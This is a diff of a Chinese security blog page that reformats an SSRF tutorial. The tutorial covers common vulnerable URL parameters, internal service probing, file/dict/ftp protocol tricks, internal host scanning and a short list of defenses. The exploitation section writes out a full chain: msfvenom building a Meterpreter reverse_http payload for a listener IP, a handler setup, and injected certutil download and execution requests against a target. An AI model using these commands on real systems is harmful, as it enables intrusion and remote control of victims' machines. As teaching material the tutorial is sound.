@@ -465,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
@@ -539,42 +539,47 @@
 </ul>
 <p><strong>测试点</strong></p>
 <p>当我们在url中看到以下参数时可进行尝试</p>
-<ul>
-<li>```<br>share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain<pre class="line-numbers language-none"><code class="language-none">
-## 3、SSRF漏洞利用
+<pre class="line-numbers language-none"><code class="language-none">share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-1、服务探针：
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a></li>
-</ul>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:3306/">http://127.0.0.1:3306/</a></p>
-<pre class="line-numbers language-none"><code class="language-none">
-2、协议玩法：
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>file:///D:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a></p>
-<p>dict://127.0.0.1:3306/info</p>
-<p><a href="ftp://192.168.46.148/">ftp://192.168.46.148:21</a></p>
-<pre class="line-numbers language-none"><code class="language-none">
-3、内网扫描：
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>//扫描内网存活主机<br><a target="_blank" rel="noopener" href="http://192.168.0.1:8080/">http://192.168.0.1:8080</a><br><a target="_blank" rel="noopener" href="http://192.168.0.2:8080/">http://192.168.0.2:8080</a><br>…<br>//可以用burp进行枚举</p>
-<pre class="line-numbers language-none"><code class="language-none">
-4、漏洞利用：
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>1、生成：利用msf生成木马<br>msfvenom -p windows/meterpreter/reverse_http LHOST=47.94.236.117 LPORT=6688 -f exe -o xx.exe<br>2、监听：<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_http<br>set lhost 0.0.0.0<br>set lport 6688<br>run<br>3、下载：将木马放到远程服务器构造payload下载到目标内网<br><a target="_blank" rel="noopener" href="http://192.168.46.148:8080/?search==%00%7B.exec%7Ccmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://xx.xx.xx.xx/xx.exe.%7D">http://192.168.46.148:8080/?search==%00{.exec|cmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://xx.xx.xx.xx/xx.exe.}</a><br>4、执行：<br><a target="_blank" rel="noopener" href="http://192.168.46.148:8080/?search==%00%7B.exec%7Cxx.exe.%7D">http://192.168.46.148:8080/?search==%00{.exec|xx.exe.}</a></p>
-<pre><code>
+<h2 id="3、SSRF漏洞利用"><a href="#3、SSRF漏洞利用" class="headerlink" title="3、SSRF漏洞利用"></a>3、SSRF漏洞利用</h2><p>1、服务探针：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;
+
+http:&#x2F;&#x2F;127.0.0.1:3306&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>2、协议玩法：</p>
+<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;D:&#x2F;www.txt
+
+dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;info
+
+ftp:&#x2F;&#x2F;192.168.46.148:21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>3、内网扫描：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;扫描内网存活主机
+http:&#x2F;&#x2F;192.168.0.1:8080
+http:&#x2F;&#x2F;192.168.0.2:8080
+...
+&#x2F;&#x2F;可以用burp进行枚举<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>4、漏洞利用：</p>
+<pre class="line-numbers language-none"><code class="language-none">1、生成：利用msf生成木马
+msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f exe -o xx.exe
+2、监听：
+use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_http
+set lhost 0.0.0.0
+set lport 6688
+run
+3、下载：将木马放到远程服务器构造payload下载到目标内网
+http:&#x2F;&#x2F;192.168.46.148:8080&#x2F;?search&#x3D;&#x3D;%00&#123;.exec|cmd.exe%20&#x2F;c%20certutil%20-urlcache%20-split%20-f%20http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;xx.exe.&#125; 
+4、执行：
+http:&#x2F;&#x2F;192.168.46.148:8080&#x2F;?search&#x3D;&#x3D;%00&#123;.exec|xx.exe.&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
-## 4、SSRF漏洞防御
 
-1、禁用跳转
-
-2、禁用不需要的协议
-
-3、固定或限制资源地址
-
-4、错误信息统一信息处理
-</code></pre>
+<h2 id="4、SSRF漏洞防御"><a href="#4、SSRF漏洞防御" class="headerlink" title="4、SSRF漏洞防御"></a>4、SSRF漏洞防御</h2><p>1、禁用跳转</p>
+<p>2、禁用不需要的协议</p>
+<p>3、固定或限制资源地址</p>
+<p>4、错误信息统一信息处理</p>
 
                 
             </div>
